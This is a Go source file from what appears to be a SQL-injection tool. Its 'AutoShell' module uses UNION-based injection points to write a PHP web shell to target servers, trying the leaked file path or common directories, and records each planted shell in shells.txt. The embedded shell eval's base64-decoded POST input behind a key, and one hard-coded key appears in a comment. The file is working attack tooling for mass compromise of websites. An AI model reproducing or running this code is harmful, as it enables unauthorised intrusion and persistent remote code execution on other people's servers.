package modules

import (
	"fmt"
	"git.quartzinc.dev/Zertex/XDGv2/injection"
	"git.quartzinc.dev/Zertex/XDGv2/manager"
	"git.quartzinc.dev/Zertex/XDGv2/qtui"
	"git.quartzinc.dev/Zertex/XDGv2/utils"
	"github.com/paulbellamy/ratecounter"
	"github.com/spf13/viper"
	"github.com/therecipe/qt/widgets"
	"os"
	"path"
	"strings"
	"sync"
	"time"
)

type AutoShellModule struct {
	Index int
	Payload int
	InjectableChan chan *injection.Injection
	ShellChan chan string
	UILock *sync.RWMutex
	UIMap map[int]*injection.Injection
	UIMutex sync.Mutex
}

var AutoSheller *AutoShellModule

var phpShell = `<?php
error_reporting(0);
set_time_limit(0);
if ($_GET['q']=='1'){echo '200'; exit;}

if($_GET['key']=='%s')eval(base64_decode($_POST['fack']));
if(md5($_GET['key'])=='%s')eval(base64_decode($_POST['fack']));
?>` // original key: sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG


func (am *AutoShellModule) Start(injectables []*injection.Injection) {
	manager.PManager.ResetCtx()
	utils.RequestCounter = 0
	utils.ErrorCounter = 0
	utils.RateCounter = ratecounter.NewRateCounter(1 * time.Second)
	utils.StartTime = time.Now()
	threads := viper.GetInt("core.Threads")
	utils.GlobalSem = make(chan interface{}, threads)
	am.InjectableChan = make(chan *injection.Injection)
	am.UIMap = make(map[int]*injection.Injection)
	am.ShellChan = make(chan string)

	go func() {
		f, _ := os.Create("shells.txt")
		for shell := range am.ShellChan {
			f.WriteString(shell + "\r\n")
		}
	}()

	wg := sync.WaitGroup{}
	wg.Add(threads)
	for i := 0; i < threads; i++ {
		utils.GlobalSem<-0
		go func() {
			defer func() {
				wg.Done()
				<-utils.GlobalSem
			}()
			for inj := range am.InjectableChan {
				if inj.Technique != injection.UNION {
					continue
				}
				am.UIMutex.Lock()
				count := qtui.Main.AutoShellTable.RowCount()
				qtui.Main.AutoShellTable.SetRowCount(count+1)
				qtui.Main.AutoShellTable.SetItem(count, 0, widgets.NewQTableWidgetItem2(inj.Base.String(), 0))
				am.UIMap[count] = inj
				am.UIMutex.Unlock()

				var payload string
				if strings.Contains(path.Ext(inj.Base.Path), "php") {
					payload = strings.ReplaceAll(strings.ReplaceAll(fmt.Sprintf(phpShell, qtui.Main.AutoShellKey.Text(), utils.GetMD5Hash(qtui.Main.AutoShellKey.Text())), "\n", " "), "\r", "")
				} else if strings.Contains(path.Ext(inj.Base.Path), "asp") {
					qtui.Main.AutoShellTable.SetItem(count, 1, widgets.NewQTableWidgetItem2("Not Supported", 0))
					qtui.Main.AutoShellTable.SetItem(count, 2, widgets.NewQTableWidgetItem2("Not Supported", 0))
					qtui.Main.AutoShellTable.SetItem(count, 3, widgets.NewQTableWidgetItem2("N", 0))
					continue
				}

				if fpd, err := inj.GetFilePath(); err == nil {
					qtui.Main.AutoShellTable.SetItem(count, 1, widgets.NewQTableWidgetItem2(path.Ext(fpd), 0))
					qtui.Main.AutoShellTable.SetItem(count, 2, widgets.NewQTableWidgetItem2(fpd, 0))
					if shell, err := inj.DumpFile(payload, path.Dir(fpd)); err == nil {
						qtui.Main.AutoShellTable.SetItem(count, 3, widgets.NewQTableWidgetItem2("Y", 0))
						am.ShellChan <- shell
					} else {
						qtui.Main.AutoShellTable.SetItem(count, 3, widgets.NewQTableWidgetItem2("N", 0))
					}
					continue
				} else {
					qtui.Main.AutoShellTable.SetItem(count,1, widgets.NewQTableWidgetItem2("N/A", 0))
				}

				for _, potential := range injection.CommonDirectories {
					if shell, err := inj.DumpFile(payload, potential); err == nil {
						qtui.Main.AutoShellTable.SetItem(count, 2, widgets.NewQTableWidgetItem2(potential, 0))
						qtui.Main.AutoShellTable.SetItem(count, 3, widgets.NewQTableWidgetItem2("Y", 0))
						am.ShellChan <- shell
						goto d
					}
				}
				qtui.Main.AutoShellTable.SetItem(count, 3, widgets.NewQTableWidgetItem2("N", 0))
			d:
			}
		}()
	}

	var inj *injection.Injection
	for am.Index, inj = range injectables {
		select {
		case <- utils.Done:
			goto done
		case am.InjectableChan <- inj:
		}
	}
	done:
	close(am.InjectableChan)
	f := make(chan interface{})
	go func() {
		wg.Wait()
		close(f)
	}()
	select {
	case <-f:
		am.Index = 0
	case <- utils.Kill:
	}
}

/*

*/